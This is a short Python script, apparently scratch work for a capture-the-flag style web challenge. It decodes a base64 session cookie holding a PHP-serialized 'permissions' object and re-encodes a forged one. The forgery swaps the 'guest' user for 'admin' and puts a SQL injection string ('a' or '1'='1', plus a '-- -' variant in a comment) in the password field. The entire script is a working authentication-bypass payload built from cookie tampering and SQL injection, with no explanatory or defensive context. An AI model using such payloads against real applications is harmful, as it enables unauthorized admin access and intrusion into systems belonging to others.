from base64 import b64decode
from base64 import b64encode

cookie = "TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiZ3Vlc3QiO3M6ODoicGFzc3dvcmQiO3M6NToiZ3Vlc3QiO30%253D"
print(b64decode("TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiYWRtaW4iO3M6ODoicGFzc3dvcmQiO3M6MTI6ImEnIG9yICcxJz0nMSI7fTZw"))
print(b64encode("""O:11:"permissions":2:{s:8:"username";s:5:"admin";s:8:"password";s:12:"a' or '1'='1";}6p"""))
# O:11:"permissions":2:{s:8:"username";s:5:"admin";s:8:"password";s:12:"a' or '1'='1";}6p
# O:11:"permissions":2:{s:8:"username";s:5:"admin";s:8:"password";s:17:"a' or '1'='1' -- -";}6p
